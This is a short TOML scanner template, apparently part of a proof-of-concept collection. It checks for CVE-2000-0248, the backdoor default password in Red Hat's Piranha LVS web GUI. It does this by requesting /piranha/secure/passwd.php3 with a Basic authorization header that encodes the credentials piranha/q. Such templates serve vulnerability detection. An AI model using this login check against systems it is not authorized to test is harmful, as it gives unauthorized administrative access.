[info]
author = "ave"
description = "Red Hat Linux Piranha LVS Web GUI 后门默认密码验证，使用 piranha/q 认证访问 /piranha/secure/passwd.php3 验证漏洞存在。"
id = "POC-AVE-2000-0709"
name = "CVE-2000-0248 PoC"
severity = "high"
tags = ["ave-2000-0709"]
vuln_id = [
    "CVE-2000-0248",
    "AVE-2000-0709",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/piranha/secure/passwd.php3"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic cGlyYW5oYTpx"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "word"
words = ["piranha"]
